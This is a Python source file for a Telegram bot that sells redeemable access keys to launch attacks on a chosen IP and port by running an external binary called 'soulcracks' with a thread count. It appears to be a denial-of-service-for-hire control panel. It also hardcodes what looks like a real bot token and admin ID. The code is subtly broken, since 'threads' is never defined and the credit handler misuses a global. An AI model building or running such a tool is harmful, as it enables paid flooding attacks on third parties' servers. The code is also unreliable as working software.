import subprocess
import random
import string
import time
from datetime import datetime, timedelta
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram import Update
from telegram.ext import CommandHandler, CallbackContext

# Bot Token & Admin ID
TOKEN = "7855801186:AAHTQQTYcMgIYaRGkcB6hkfBTpz_wxXTTEI"
ADMIN_ID = 6882674372  # Replace with your actual admin Telegram ID

# Attack Variables
BINARY_PATH = "./soulcracks"  # Path to attack binary
process = None
target_ip = None
target_port = None

# Global Settings
valid_keys = set()  # Store generated keys
user_access = {}  # Users with expiration time
cooldown = 5  # Default cooldown
credit_text = "WELCOME TO APNA BHAI BOT"  # Default credit message

# Generate a random key
def generate_key():
    return "APNA-BHAI" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))

# Check if user has access
def has_access(user_id):
    return user_id in user_access and user_access[user_id] > datetime.now()

# Start Command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if not has_access(user_id):
        await update.message.reply_text("🚫 You need to redeem a key or be added by an admin! Press 🎟️ Redeem.")
        return

    keyboard = [
        [KeyboardButton("🚀 Attack"), KeyboardButton("🔰 Panel")],
        [KeyboardButton("🔥 Start"), KeyboardButton("🛑 Stop")],
        [KeyboardButton("⚙️ Settings"), KeyboardButton("🎟️ Redeem")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(f"👋 {credit_text}", reply_markup=reply_markup)

# Generate Key (Admin Only)
async def panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text("❌ You are not authorized to generate keys.")
        return

    key = generate_key()
    valid_keys.add(key)
    await update.message.reply_text(f"🔑 **Generated Key:** `{key}`\nUse `/redeem <KEY>` to activate.", parse_mode="Markdown")

# Redeem Key
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    key = update.message.text.split()[-1]

    if key in valid_keys:
        valid_keys.remove(key)
        user_access[user_id] = datetime.now() + timedelta(days=30)  # Default 30-day access
        await update.message.reply_text("✅ Key Redeemed! You can now use the bot.")
    else:
        await update.message.reply_text("❌ Invalid or already used key.")

# Add User (Admin Only)
async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text("❌ You are not authorized to add users.")
        return

    try:
        args = context.args
        user_id = int(args[0])
        duration = int(args[1])
        unit = args[2].lower()

        if unit == "minutes":
            expiry_time = datetime.now() + timedelta(minutes=duration)
        elif unit == "days":
            expiry_time = datetime.now() + timedelta(days=duration)
        elif unit == "years":
            expiry_time = datetime.now() + timedelta(days=duration * 365)
        else:
            await update.message.reply_text("❌ Invalid time unit! Use `minutes`, `days`, or `years`.")
            return

        user_access[user_id] = expiry_time
        await update.message.reply_text(f"✅ Added user {user_id} for {duration} {unit}.")
    except (IndexError, ValueError):
        await update.message.reply_text("❌ Usage: `/add <user_id> <duration> <minutes/days/years>`")

# Save Attack Details (IP & Port)
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global target_ip, target_port
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text("❌ You are not authorized to set the attack target.")
        return

    try:
        target_ip, target_port = update.message.text.split()[1], update.message.text.split()[2]
        await update.message.reply_text(f"✅ Attack Target Saved:\n🌐 IP: `{target_ip}`\n📌 Port: `{target_port}`", parse_mode="Markdown")
    except IndexError:
        await update.message.reply_text("❌ Usage: `/attack <IP> <Port>`", parse_mode="Markdown")

# Start Attack (Admin Only)
async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process, target_ip, target_port
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text("❌ You are not authorized to start an attack.")
        return

    if not target_ip or not target_port:
        await update.message.reply_text("⚠️ Please set the attack target first using `/attack <IP> <Port>`.")
        return

    if process and process.poll() is None:
        await update.message.reply_text("⚡ Attack is already running!")
        return

    try:
        process = subprocess.Popen(
            [BINARY_PATH, target_ip, str(target_port), str(threads)],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        await update.message.reply_text(f"🚀 **Attack started** on `{target_ip}:{target_port}` using `{threads}` threads.", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ Error starting attack: `{e}`", parse_mode="Markdown")

# Stop Attack (Admin Only)
async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text("❌ You are not authorized to stop an attack.")
        return

    if not process or process.poll() is not None:
        await update.message.reply_text("⚠️ No attack is currently running.")
        return

    process.terminate()
    process.wait()
    await update.message.reply_text("🛑 **Attack stopped.**")

# /prefix Command
async def prefix(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if not has_access(user_id):
        await update.message.reply_text("🚫 You need to redeem a key first!")
        return

    key = generate_key()
    await update.message.reply_text(f"🔑 **Your Prefix:** `{key}`", parse_mode="Markdown")

# /credit Command (Admin Only)
async def credit(update: Update, context: CallbackContext):
    args = context.args  # This is now where arguments are stored
    update.message.reply_text(f"Arguments received: {args}")


    if not args:
        await update.message.reply_text(credit_text)
        return

    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text("❌ You are not authorized to update credit.")
        return

    username = " ".join(args)
    credit_text = f"WELCOME TO {username} BOT"
    await update.message.reply_text(f"✅ Credit updated to: {credit_text}")

# Main function
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("panel", panel))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("start_attack", start_attack))
    app.add_handler(CommandHandler("stop_attack", stop_attack))
    app.add_handler(CommandHandler("prefix", prefix))
    app.add_handler(CommandHandler("credit", credit))
    app.add_handler(CommandHandler("add", add_user))

    print("🤖 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
